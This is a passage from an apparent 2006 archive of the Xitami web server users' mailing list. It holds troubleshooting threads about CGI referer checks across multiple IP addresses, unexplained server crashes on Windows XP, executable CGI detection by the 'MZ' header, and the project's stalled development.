+>the http-referer and the remote-addr fields are on the environment hash
+>by default (environment=0). You do not have to set the environment to 1
+>in config to have them on the hash.
+
+The CGI_Referer is a function in the CGI itself that picks up on the 
+servers values.
+It works fine and can catch it, except when it started thinking there 
+was a type error for some very odd reason.
+The only thing I could not understand in this type problem was why it 
+works fine on the development machine but not the server and I 
+manually checked all config files to validate they are identical indeed.
+
+>4) The http-referer will exist in the environment hash, only if there
+>actually was a referrer (a mouse click on a link or a submit button on a
+>real page bringing the user to your url). If the url was typed into the
+>address bar of the browser, there will be no http-referer. Then your
+>program  can not read it then from the environment hash.
+
+True, which is quite ok.
+Youre not supposed to be able to type in the URL directly nor link 
+from a URL outside the domains path to the cgi I wrote.
+When that happens it will refer the user back to the index page and 
+require they come in the "assigned and controlled way"
+
+
+>5) Did you print out the environment hash to yourself, under the
+>conditions that the error occurs in your browser? What do the fields
+>say? Which IP do you appear to have when the error occurs? What does the
+>http-referer say? What does your program do with this information? In
+>which line of your program does the problem happen? Is your test logic
+>entirely correct?
+
+The logic of the testing seems OK.
+What in fact happens the way it is setup is as follows
+
+
+Xitami controls the servers and assign all domains to listen to all 
+incoming IP's
+
+DNS on the other hand refers all but one of my domains to the primary 
+IP number.
+The last one, which is the largest one, with most hits, get assigned WWW and
+*.Sitename.com access through both IP numbers on the box.
+
+In this way it servers as a load balancing.
+
+The problem is that this will also affect the CGI's on the site as 
+the site can internally call itself by the following means
+
+www.Sitename.com
+sitename.com
+##.##.##.1
+##.##.##.2
+
+and all are valid CGI_Referer
+
+This is where it confuses the CGI and the Xitami server but this is 
+controlled by the DNS in the end.
+
+I will see if I cant work around this in a bit different way and if I 
+find a good solution I might post a message to
+the board about it too if someone else would like to have a solution like this.
+
+
+
+
+
+
+From admin at mrjdesign.net  Mon Feb 20 19:33:15 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Mon Feb 20 19:33:19 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+In-Reply-To: <5821ea240602201025g145bdbdfi43500ac1f086ed85@mail.gmail.co
+ m>
+References: <6.2.5.6.0.20060220180742.01bd2810@mrjdesign.net>
+	<5821ea240602201021m4a8a10a7mec62f9adc334b34c@mail.gmail.com>
+	<6.2.5.6.0.20060220182300.01c497f8@mrjdesign.net>
+	<5821ea240602201025g145bdbdfi43500ac1f086ed85@mail.gmail.com>
+Message-ID: <6.2.5.6.0.20060220183154.01c52f40@mrjdesign.net>
+
+Now that could be a reason, but I have never had a problem with Norton before.
+In fact I have used this very same setup for 
+years and never experienced as many crashes as recently.
+
+I am leaning more towards the large numbe of hits 
+to different virtual hosts causing some overload and
+xitami not being able to a) rotate the logs fast 
+enough or b) not being able to route the traffic fast enough.
+
+
+
+At 18:25 20/02/2006, you wrote:
+>On 2/20/06, MRJ InfoTech Admin <admin@mrjdesign.net> wrote:
+> >
+> >  I turned off the FTP completely since I dont 
+> really use it for this current
+> > setup and I am looking to use an SFTP solution in a near future.
+> >  The FTP does not have any effect on this since It's all off.
+>
+>It is possible that some other software is causing Xitami to crash.  A
+>common culprit is anti-virus scanners.
+>
+>-Pieter Hintjens
+>
+>
+>--
+>Xitami Users Mailing List -- For Xitami support
+>To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060220/bcea33d6/attachment.html
+From ronackgen01 at bellsouth.net  Mon Feb 20 20:28:03 2006
+From: ronackgen01 at bellsouth.net (Ron Ackerman)
+Date: Mon Feb 20 20:22:52 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+In-Reply-To: <6.2.5.6.0.20060220183154.01c52f40@mrjdesign.net>
+Message-ID: <20060220192237.FQOC2532.ibm68aec.bellsouth.net@ronscomputer>
+
+Very possible, but I have the same problem. it will crash after awhile and I
+don't know why. It may run for days before it crashes. I'm not real happy
+with the stablility. I'm running about 10 sites, I can site at the server
+all day doing any number of things, leave it alone for a hour and crash. Try
+to just restart it but it doesn't like that very much so a reboot is in
+order. But I can do a reboot then leave it for the weekend come back on
+monday and find that it crashed. Sure it might not be playing well with
+other services but that's a problem. It needs to play well with others.
+ 
+Anyway enough of my venting.
+ 
+Have a nice day!!!
+
+   _____  
+
+From: xitami-bounces@lists.xitami.org
+[mailto:xitami-bounces@lists.xitami.org] On Behalf Of MRJ InfoTech Admin
+Sent: Monday, February 20, 2006 1:33 PM
+To: Xitami Users General Discussion
+Subject: Re: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+
+
+Now that could be a reason, but I have never had a problem with Norton
+before.
+In fact I have used this very same setup for years and never experienced as
+many crashes as recently.
+
+I am leaning more towards the large numbe of hits to different virtual hosts
+causing some overload and 
+xitami not being able to a) rotate the logs fast enough or b) not being able
+to route the traffic fast enough.
+
+
+
+At 18:25 20/02/2006, you wrote:
+
+
+On 2/20/06, MRJ InfoTech Admin <admin@mrjdesign.net> wrote:
+>
+>  I turned off the FTP completely since I dont really use it for this
+current
+> setup and I am looking to use an SFTP solution in a near future.
+>  The FTP does not have any effect on this since It's all off.
+
+It is possible that some other software is causing Xitami to crash.  A
+common culprit is anti-virus scanners.
+
+-Pieter Hintjens
+
+
+--
+Xitami Users Mailing List -- For Xitami support
+To unsubscribe: HYPERLINK
+"http://lists.xitami.org/mailman/listinfo/xitami"http://lists.xitami.org/mai
+lman/listinfo/xitami
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    HYPERLINK
+"http://www.mrjdesign.net/"http://www.mrjdesign.net 
+
+
+
+
+--
+No virus found in this incoming message.
+Checked by AVG Free Edition.
+Version: 7.1.375 / Virus Database: 267.15.11/264 - Release Date: 2/17/2006
+
+
+
+-- 
+No virus found in this outgoing message.
+Checked by AVG Free Edition.
+Version: 7.1.375 / Virus Database: 267.15.11/264 - Release Date: 2/17/2006
+ 
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060220/936a3cdc/attachment.htm
+From admin at mrjdesign.net  Mon Feb 20 20:32:41 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Mon Feb 20 20:32:46 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+In-Reply-To: <20060220192237.FQOC2532.ibm68aec.bellsouth.net@ronscompute
+ r>
+References: <6.2.5.6.0.20060220183154.01c52f40@mrjdesign.net>
+	<20060220192237.FQOC2532.ibm68aec.bellsouth.net@ronscomputer>
+Message-ID: <6.2.5.6.0.20060220193005.01c78128@mrjdesign.net>
+
+
+
+Definitely agree with you there
+
+I just spoke to a friend who is running an Apache server with 100,000 
+files on his site.
+He has a log file buildup of about 100 Mb every 24 hours, which is huge.
+I am really thankful Xitami doesn't do that to me, since I normally 
+get 100 Mb in a week on 100,000 files.
+
+Although, if its not able to rotate that little amount, what will 
+happen when I start getting a higher number of hits on say 25 sites?
+
+
+At 19:28 20/02/2006, you wrote:
+>It needs to play well with others.
+>
+>Anyway enough of my venting.
+>
+>Have a nice day!!!
+>
+>
+>----------
+>From: xitami-bounces@lists.xitami.org 
+>[mailto:xitami-bounces@lists.xitami.org] On Behalf Of MRJ InfoTech Admin
+>Sent: Monday, February 20, 2006 1:33 PM
+>To: Xitami Users General Discussion
+>Subject: Re: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+>
+>Now that could be a reason, but I have never had a problem with Norton before.
+>In fact I have used this very same setup for years and never 
+>experienced as many crashes as recently.
+>
+>I am leaning more towards the large numbe of hits to different 
+>virtual hosts causing some overload and
+>xitami not being able to a) rotate the logs fast enough or b) not 
+>being able to route the traffic fast enough.
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060220/61fb3f00/attachment.html
+From ronackgen01 at bellsouth.net  Mon Feb 20 21:04:51 2006
+From: ronackgen01 at bellsouth.net (Ron Ackerman)
+Date: Mon Feb 20 20:59:17 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+In-Reply-To: <6.2.5.6.0.20060220193005.01c78128@mrjdesign.net>
+Message-ID: <20060220195914.GFNA2532.ibm68aec.bellsouth.net@ronscomputer>
+
+I have started to learn Apache and have put it on my new win2003 server for
+higher end sites. I'll be keeping xitami for some small sites but may
+eventually move everything over. Xitami has been good for me for the most
+part. It's great for development but I wanted something capable of doing mod
+rewrites and ASP with less crashes. I still have about 10 sites on my xitami
+server, move 3 off to the Apache server. 
+
+   _____  
+
+From: xitami-bounces@lists.xitami.org
+[mailto:xitami-bounces@lists.xitami.org] On Behalf Of MRJ InfoTech Admin
+Sent: Monday, February 20, 2006 2:33 PM
+To: Xitami Users General Discussion
+Subject: RE: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+
+
+
+
+Definitely agree with you there
+
+I just spoke to a friend who is running an Apache server with 100,000 files
+on his site.
+He has a log file buildup of about 100 Mb every 24 hours, which is huge.
+I am really thankful Xitami doesn't do that to me, since I normally get 100
+Mb in a week on 100,000 files.
+
+Although, if its not able to rotate that little amount, what will happen
+when I start getting a higher number of hits on say 25 sites?
+
+
+At 19:28 20/02/2006, you wrote:
+
+
+It needs to play well with others.
+ 
+Anyway enough of my venting.
+ 
+Have a nice day!!!
+
+
+   _____  
+
+From: xitami-bounces@lists.xitami.org [HYPERLINK
+"mailto:xitami-bounces@lists.xitami.org"
+mailto:xitami-bounces@lists.xitami.org] On Behalf Of MRJ InfoTech Admin
+Sent: Monday, February 20, 2006 1:33 PM
+To: Xitami Users General Discussion
+Subject: Re: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+
+Now that could be a reason, but I have never had a problem with Norton
+before.
+In fact I have used this very same setup for years and never experienced as
+many crashes as recently.
+
+I am leaning more towards the large numbe of hits to different virtual hosts
+causing some overload and 
+xitami not being able to a) rotate the logs fast enough or b) not being able
+to route the traffic fast enough.
+
+
+--
+No virus found in this incoming message.
+Checked by AVG Free Edition.
+Version: 7.1.375 / Virus Database: 267.15.11/264 - Release Date: 2/17/2006
+
+
+
+-- 
+No virus found in this outgoing message.
+Checked by AVG Free Edition.
+Version: 7.1.375 / Virus Database: 267.15.11/264 - Release Date: 2/17/2006
+ 
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060220/11134dce/attachment.htm
+From dscontroller at comcast.net  Mon Feb 20 21:35:18 2006
+From: dscontroller at comcast.net (Charles Schmidling)
+Date: Mon Feb 20 21:35:34 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+References: <20060220192237.FQOC2532.ibm68aec.bellsouth.net@ronscomputer>
+Message-ID: <002e01c6365d$2a4d3840$6401a80a@comcast.net>
+
+Just a quick thought:
+
+    My regular Xitami server (p166 orphan) runs flawlessly for months at a time, although I'm not pushing the traffic you guys are.  However, in order to add some disk space without having everything go down for a while, I moved all server stuff to an older computer (docked Toshiba 205 Laptop) with Win98SE and test ran it.  CRASHed overnight!  My working laptop is also a 205 and since I upped it to Win98SE, I crash regularly, usually with the network pc card installed but sometimes not.
+
+  The best I can figure it is that somewhere a wakeup command doesn't process right and it locks up.  Usually the computer has been inactive for a long while (hour +) and has screen and disks timed off.  Sometimes it wakes up, sometime it doesn't.  Sometimes it went to sleep with IE on screen, sometimes not.  None of this seems Xitami related although an active TCP/IP connection is suspicious.  Running test right now without any software loaded.
+
+I thought display drivers were involved but not.  Thought maybe a TCP/IP hangup (memory leak?).  Just not everything wakes up after a nap. ACPI maybe?  Power Management?
+
+Hope this is helpful,
+
+Charles
+
+Configuration:
+Xitami 2.5c2 (virtual host) on P166 (Win98SE) w/ 256mb, Php 4.something, MySQL something,
+FD Daemon, Mercury Mail, AVGFree, ZoneAlarm.
+
+
+  ----- Original Message ----- 
+  From: Ron Ackerman 
+  To: 'Xitami Users General Discussion' 
+  Sent: Monday, February 20, 2006 11:28 AM
+  Subject: RE: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+
+
+  Very possible, but I have the same problem. it will crash after awhile and I don't know why. It may run for days before it crashes. I'm not real happy with the stablility. I'm running about 10 sites, I can site at the server all day doing any number of things, leave it alone for a hour and crash. Try to just restart it but it doesn't like that very much so a reboot is in order. But I can do a reboot then leave it for the weekend come back on monday and find that it crashed. Sure it might not be playing well with other services but that's a problem. It needs to play well with others.
+
+  Anyway enough of my venting.
+
+  Have a nice day!!!
+
+
+
+------------------------------------------------------------------------------
+  From: xitami-bounces@lists.xitami.org [mailto:xitami-bounces@lists.xitami.org] On Behalf Of MRJ InfoTech Admin
+  Sent: Monday, February 20, 2006 1:33 PM
+  To: Xitami Users General Discussion
+  Subject: Re: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+
+
+  Now that could be a reason, but I have never had a problem with Norton before.
+  In fact I have used this very same setup for years and never experienced as many crashes as recently.
+
+  I am leaning more towards the large numbe of hits to different virtual hosts causing some overload and 
+  xitami not being able to a) rotate the logs fast enough or b) not being able to route the traffic fast enough.
+
+
+
+  At 18:25 20/02/2006, you wrote:
+
+    On 2/20/06, MRJ InfoTech Admin <admin@mrjdesign.net> wrote:
+    >
+    >  I turned off the FTP completely since I dont really use it for this current
+    > setup and I am looking to use an SFTP solution in a near future.
+    >  The FTP does not have any effect on this since It's all off.
+
+    It is possible that some other software is causing Xitami to crash.  A
+    common culprit is anti-virus scanners.
+
+    -Pieter Hintjens
+
+
+    --
+    Xitami Users Mailing List -- For Xitami support
+    To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+  -?2005-------------------------------
+  MRJ Information Technology Ltd.
+  35 Camden High St., Camden/London, NW1 7JE
+  United Kingdom    http://www.mrjdesign.net 
+
+
+
+  --
+  No virus found in this incoming message.
+  Checked by AVG Free Edition.
+  Version: 7.1.375 / Virus Database: 267.15.11/264 - Release Date: 2/17/2006
+
+
+
+
+
+  --
+  No virus found in this outgoing message.
+  Checked by AVG Free Edition.
+  Version: 7.1.375 / Virus Database: 267.15.11/264 - Release Date: 2/17/2006
+
+
+
+
+------------------------------------------------------------------------------
+
+
+
+  --
+  Xitami Users Mailing List -- For Xitami support
+  To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060220/6aac427b/attachment.html
+From admin at mrjdesign.net  Mon Feb 20 21:48:28 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Mon Feb 20 21:48:37 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+In-Reply-To: <002e01c6365d$2a4d3840$6401a80a@comcast.net>
+References: <20060220192237.FQOC2532.ibm68aec.bellsouth.net@ronscomputer>
+	<002e01c6365d$2a4d3840$6401a80a@comcast.net>
+Message-ID: <6.2.5.6.0.20060220204057.01c4ac28@mrjdesign.net>
+
+
+Just to see if it makes a difference I turned off 
+all power saving related things on the server and 
+will leave it at that for now.
+I actually once asked a few friends, (just over 
+45,000) in a forum to hit the living h*** out of 
+the machine while streaming a little video clip on it.
+That in it self did nothing to the xitami server 
+but it did slow down the connections of course.
+
+That's why I have a hard time understanding why 
+the Xitami would react so adversely to log files building up.
+Perhaps the power saving is an issue.
+
+You on the other hand is running 98SE and we're 
+on NT based O/S's with XP so there is a major 
+difference in how TCP/IP is handled I would assume.
+
+Your configuration is
+>Configuration:
+>Xitami 2.5c2 (virtual host) on P166 (Win98SE) w/ 
+>256mb, Php 4.something, MySQL something,
+>FD Daemon, Mercury Mail, AVGFree, ZoneAlarm.
+
+and as a comparison I am now testing out the following...
+
+Xitami 2.5c2, (with 12 vhosts) on a P4 3.0 GHz 
+Hyper threaded Intel 1 mb buffer, (no PHP or 
+MySQL which saves me 12 Mb memory btw.)
+I run 1 GB DRAM and have 2 x 250 GB disk space 
+200 Gb dedicated for the vhosts and the rest for mail and dns
+
+Norton Antivirus for now, ZoneAlarm for testing 
+(I tried outpost too but it locked up the 
+services totally and takes to much overhead)
+MailEnable Std. Mail server and BIND for DNS serving.
+
+
+
+
+
+At 20:35 20/02/2006, you wrote:
+>Just a quick thought:
+>
+>     My regular Xitami server (p166 orphan) runs 
+> flawlessly for months at a time, although I'm 
+> not pushing the traffic you guys are.  However, 
+> in order to add some disk space without having 
+> everything go down for a while, I moved all 
+> server stuff to an older computer (docked 
+> Toshiba 205 Laptop) with Win98SE and test ran 
+> it.  CRASHed overnight!  My working laptop is 
+> also a 205 and since I upped it to Win98SE, I 
+> crash regularly, usually with the network pc card installed but sometimes not.
+>
+>   The best I can figure it is that somewhere a 
+> wakeup command doesn't process right and it 
+> locks up.  Usually the computer has been 
+> inactive for a long while (hour +) and has 
+> screen and disks timed off.  Sometimes it wakes 
+> up, sometime it doesn't.  Sometimes it went to 
+> sleep with IE on screen, sometimes not.  None 
+> of this seems Xitami related although an active 
+> TCP/IP connection is suspicious.  Running test 
+> right now without any software loaded.
+>
+>I thought display drivers were involved but 
+>not.  Thought maybe a TCP/IP hangup (memory 
+>leak?).  Just not everything wakes up after a 
+>nap. ACPI maybe?  Power Management?
+>
+>Hope this is helpful,
+>
+>Charles
+>
+>Configuration:
+>Xitami 2.5c2 (virtual host) on P166 (Win98SE) w/ 
+>256mb, Php 4.something, MySQL something,
+>FD Daemon, Mercury Mail, AVGFree, ZoneAlarm.
+>
+>
+>----- Original Message -----
+>From: <mailto:ronackgen01@bellsouth.net>Ron Ackerman
+>To: <mailto:xitami@lists.xitami.org>'Xitami Users General Discussion'
+>Sent: Monday, February 20, 2006 11:28 AM
+>Subject: RE: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+>
+>Very possible, but I have the same problem. it 
+>will crash after awhile and I don't know why. It 
+>may run for days before it crashes. I'm not real 
+>happy with the stablility. I'm running about 10 
+>sites, I can site at the server all day doing 
+>any number of things, leave it alone for a hour 
+>and crash. Try to just restart it but it doesn't 
+>like that very much so a reboot is in order. But 
+>I can do a reboot then leave it for the weekend 
+>come back on monday and find that it crashed. 
+>Sure it might not be playing well with other 
+>services but that's a problem. It needs to play well with others.
+>
+>Anyway enough of my venting.
+>
+>Have a nice day!!!
+>
+>
+>----------
+>From: xitami-bounces@lists.xitami.org 
+>[mailto:xitami-bounces@lists.xitami.org] On Behalf Of MRJ InfoTech Admin
+>Sent: Monday, February 20, 2006 1:33 PM
+>To: Xitami Users General Discussion
+>Subject: Re: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+>
+>Now that could be a reason, but I have never had a problem with Norton before.
+>In fact I have used this very same setup for 
+>years and never experienced as many crashes as recently.
+>
+>I am leaning more towards the large numbe of 
+>hits to different virtual hosts causing some overload and
+>xitami not being able to a) rotate the logs fast 
+>enough or b) not being able to route the traffic fast enough.
+>
+>
+>
+>At 18:25 20/02/2006, you wrote:
+>>On 2/20/06, MRJ InfoTech Admin <admin@mrjdesign.net> wrote:
+>> >
+>> >  I turned off the FTP completely since I 
+>> dont really use it for this current
+>> > setup and I am looking to use an SFTP solution in a near future.
+>> >  The FTP does not have any effect on this since It's all off.
+>>
+>>It is possible that some other software is causing Xitami to crash.  A
+>>common culprit is anti-virus scanners.
+>>
+>>-Pieter Hintjens
+>>
+>>
+>>--
+>>Xitami Users Mailing List -- For Xitami support
+>>To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+>
+>-?2005-------------------------------
+>MRJ Information Technology Ltd.
+>35 Camden High St., Camden/London, NW1 7JE
+>United Kingdom    http://www.mrjdesign.net
+>
+>--
+>No virus found in this incoming message.
+>Checked by AVG Free Edition.
+>Version: 7.1.375 / Virus Database: 267.15.11/264 - Release Date: 2/17/2006
+>
+>
+>--
+>No virus found in this outgoing message.
+>Checked by AVG Free Edition.
+>Version: 7.1.375 / Virus Database: 267.15.11/264 - Release Date: 2/17/2006
+>
+>
+>----------
+>
+>--
+>Xitami Users Mailing List -- For Xitami support
+>To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+>
+>
+>--
+>Xitami Users Mailing List -- For Xitami support
+>To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060220/53253c8e/attachment.htm
+From rolinger1 at hotmail.com  Mon Feb 20 21:51:32 2006
+From: rolinger1 at hotmail.com (RPO)
+Date: Mon Feb 20 21:52:22 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+References: <20060220195914.GFNA2532.ibm68aec.bellsouth.net@ronscomputer>
+Message-ID: <BAY105-DAV16960F9969596B372068E0F8FF0@phx.gbl>
+
+On that note, has there been any new development with Xitami over the years?  Will they continue to develop it at all or will it simply become obsolete?  I run the standard version 2.4d9 on Win2K and am going to probably upgrade to the professional version at some point but I have been on this version for several years now.  The latest version isn't to far past the version I am running which tells me that 2.5c2 was completed years ago and there haven't been any newer versions since.
+
+
+  ----- Original Message ----- 
+  From: Ron Ackerman 
+  To: 'Xitami Users General Discussion' 
+  Sent: Monday, February 20, 2006 12:04 PM
+  Subject: RE: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+
+
+  I have started to learn Apache and have put it on my new win2003 server for higher end sites. I'll be keeping xitami for some small sites but may eventually move everything over. Xitami has been good for me for the most part. It's great for development but I wanted something capable of doing mod rewrites and ASP with less crashes. I still have about 10 sites on my xitami server, move 3 off to the Apache server. 
+
+
+
+------------------------------------------------------------------------------
+  From: xitami-bounces@lists.xitami.org [mailto:xitami-bounces@lists.xitami.org] On Behalf Of MRJ InfoTech Admin
+  Sent: Monday, February 20, 2006 2:33 PM
+  To: Xitami Users General Discussion
+  Subject: RE: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+
+
+
+
+  Definitely agree with you there
+
+  I just spoke to a friend who is running an Apache server with 100,000 files on his site.
+  He has a log file buildup of about 100 Mb every 24 hours, which is huge.
+  I am really thankful Xitami doesn't do that to me, since I normally get 100 Mb in a week on 100,000 files.
+
+  Although, if its not able to rotate that little amount, what will happen when I start getting a higher number of hits on say 25 sites?
+
+
+  At 19:28 20/02/2006, you wrote:
+
+    It needs to play well with others.
+     
+    Anyway enough of my venting.
+     
+    Have a nice day!!!
+
+
+----------------------------------------------------------------------------
+    From: xitami-bounces@lists.xitami.org [ mailto:xitami-bounces@lists.xitami.org] On Behalf Of MRJ InfoTech Admin
+    Sent: Monday, February 20, 2006 1:33 PM
+    To: Xitami Users General Discussion
+    Subject: Re: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+
+    Now that could be a reason, but I have never had a problem with Norton before.
+    In fact I have used this very same setup for years and never experienced as many crashes as recently.
+
+    I am leaning more towards the large numbe of hits to different virtual hosts causing some overload and 
+    xitami not being able to a) rotate the logs fast enough or b) not being able to route the traffic fast enough.
+
+
+  --
+  No virus found in this incoming message.
+  Checked by AVG Free Edition.
+  Version: 7.1.375 / Virus Database: 267.15.11/264 - Release Date: 2/17/2006
+
+
+
+
+
+  --
+  No virus found in this outgoing message.
+  Checked by AVG Free Edition.
+  Version: 7.1.375 / Virus Database: 267.15.11/264 - Release Date: 2/17/2006
+
+
+
+
+------------------------------------------------------------------------------
+
+
+
+  --
+  Xitami Users Mailing List -- For Xitami support
+  To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060220/dddcbfeb/attachment.html
+From ph at imatix.com  Mon Feb 20 21:52:36 2006
+From: ph at imatix.com (Pieter Hintjens)
+Date: Mon Feb 20 21:52:46 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+In-Reply-To: <6.2.5.6.0.20060220204057.01c4ac28@mrjdesign.net>
+References: <20060220192237.FQOC2532.ibm68aec.bellsouth.net@ronscomputer>
+	<002e01c6365d$2a4d3840$6401a80a@comcast.net>
+	<6.2.5.6.0.20060220204057.01c4ac28@mrjdesign.net>
+Message-ID: <5821ea240602201252o27d9770cu9baa573e2c667f43@mail.gmail.com>
+
+On 2/20/06, MRJ InfoTech Admin <admin@mrjdesign.net> wrote:
+
+>  That's why I have a hard time understanding why the Xitami would react so
+> adversely to log files building up.
+
+Indeed.  Xitami does have some quirks, but one of the things that
+makes it so nice is that the multithreaded engine is very robust
+against load.  You should not be able to crash it simply by loading
+it, and I've never seen that happen, except with some FTP transfers.
+
+-Pieter Hintjens
+
+From admin at mrjdesign.net  Mon Feb 20 21:53:50 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Mon Feb 20 21:53:57 2006
+Subject: [Xitami] CGI and Xitami crahses?
+Message-ID: <6.2.5.6.0.20060220205036.01c7d068@mrjdesign.net>
+
+
+I was sitting here reading through the entire 
+online manual of Xitami and found a very 
+interesting entry I had not paid attention to previously.
+
+The maual reads...
+"32-bit executable .exe files. The files do not 
+actually need an .exe. extension; Xitami will 
+execute a file with any name so long as it is in 
+the CGI directory and 'looks' like an executable 
+file (precisely: it must start with the letters "MZ") "
+
+If a CGI is a 32 bit exe-cutable and is not named 
+MZ_SomeFileName.exe, would that be the cause of these many crashes then?
+Why MZ? since when is that a requirement for any server standard ?
+
+
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060220/57645cc3/attachment.htm
+From ph at imatix.com  Mon Feb 20 21:55:45 2006
+From: ph at imatix.com (Pieter Hintjens)
+Date: Mon Feb 20 21:55:50 2006
+Subject: [Xitami] CGI and Xitami crahses?
+In-Reply-To: <6.2.5.6.0.20060220205036.01c7d068@mrjdesign.net>
+References: <6.2.5.6.0.20060220205036.01c7d068@mrjdesign.net>
+Message-ID: <5821ea240602201255v6c2d8793o95f82fe7c2340b83@mail.gmail.com>
+
+On 2/20/06, MRJ InfoTech Admin <admin@mrjdesign.net> wrote:
+
+>  "32-bit executable .exe files. The files do not actually need an .exe.
+> extension; Xitami will execute a file with any name so long as it is in the
+> CGI directory and 'looks' like an executable file (precisely: it must start
+> with the letters "MZ") "
+
+The file must literally start with MZ, as the first two bytes of its
+content.  This is the standard defined by some programmer working for
+Microsoft, years ago, who's initials were M.Z.
+
+-Pieter Hintjens
+
+From admin at mrjdesign.net  Mon Feb 20 21:57:51 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Mon Feb 20 21:57:59 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+In-Reply-To: <BAY105-DAV16960F9969596B372068E0F8FF0@phx.gbl>
+References: <20060220195914.GFNA2532.ibm68aec.bellsouth.net@ronscomputer>
+	<BAY105-DAV16960F9969596B372068E0F8FF0@phx.gbl>
+Message-ID: <6.2.5.6.0.20060220205447.01c6bd60@mrjdesign.net>
+
+At 20:51 20/02/2006, you wrote:
+>On that note, has there been any new development with Xitami over 
+>the years?  Will they continue to develop it at all or will it 
+>simply become obsolete?  I run the standard version 2.4d9 on Win2K 
+>and am going to probably upgrade to the professional version at some 
+>point but I have been on this version for several years now.  The 
+>latest version isn't to far past the version I am running which 
+>tells me that 2.5c2 was completed years ago and there haven't been 
+>any newer versions since.
+
+
+As far I can tell there are no plans on picking up a development on 
+the Xitami server from Imatix again, which in it self is really sad.
+What I have decided to do for now is wait but I have a friend 
+studying in Denmark at the moment who should be coming over here 
+shortly and he's a real guru with C and C++.
+I will likely try to have my company spend some time and money on 
+this guy for a uni project and have him revise Xitami by the open source.
+
+If I can afford to sponsor this guy, I bet it could become a good 
+project for developing a very stabile platform
+server and also give something back to the Xitami community as a whole.
+
+When the time is right and I start this up, I'll keep this forum 
+posted on any such plans as well. 
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060220/8a22d01d/attachment.html
+From ph at imatix.com  Mon Feb 20 22:05:00 2006
+From: ph at imatix.com (Pieter Hintjens)
+Date: Mon Feb 20 22:06:31 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+In-Reply-To: <6.2.5.6.0.20060220205447.01c6bd60@mrjdesign.net>
+References: <20060220195914.GFNA2532.ibm68aec.bellsouth.net@ronscomputer>
+	<BAY105-DAV16960F9969596B372068E0F8FF0@phx.gbl>
+	<6.2.5.6.0.20060220205447.01c6bd60@mrjdesign.net>
+Message-ID: <5821ea240602201305u32f908u6d8da62c0fd017e4@mail.gmail.com>
+
+On 2/20/06, MRJ InfoTech Admin <admin@mrjdesign.net> wrote:
+
+>  I will likely try to have my company spend some time and money on this guy
+> for a uni project and have him revise Xitami by the open source.
+
+That would be a fun project.  Xitami is actually quite easy to
+improve, once you understand how the technology works.  Much easier
+than normal multithreaded code.
+
+But it's a lot of work, making releases and supporting a user
+community.  Too much work for us, we had to get back to our jobs and
+families...
+
+If your friend needs any help understanding the technology, he can email me.
+
+-Pieter Hintjens
+
+From admin at mrjdesign.net  Mon Feb 20 22:22:33 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Mon Feb 20 22:22:39 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+In-Reply-To: <5821ea240602201305u32f908u6d8da62c0fd017e4@mail.gmail.com>
